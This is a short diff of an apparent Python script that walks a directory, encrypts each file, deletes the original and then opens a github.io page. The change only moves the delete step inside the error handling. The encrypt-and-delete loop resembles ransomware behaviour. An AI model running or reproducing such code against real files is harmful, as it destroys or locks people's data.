@@ -98,9 +98,8 @@ for name in walk_sorted(argv[1]):
         if not crypted_file(name):
                 try:
                         crypt(key, name)
-                except:
-                        print("Can't encrypt : {}".format(name))
-                else:
                         rm(name)
+                except:
+                        print("Encrypt failure : {}".format(name))
 
 webbrowser.open_new('http://bunnypixelarray.github.io')
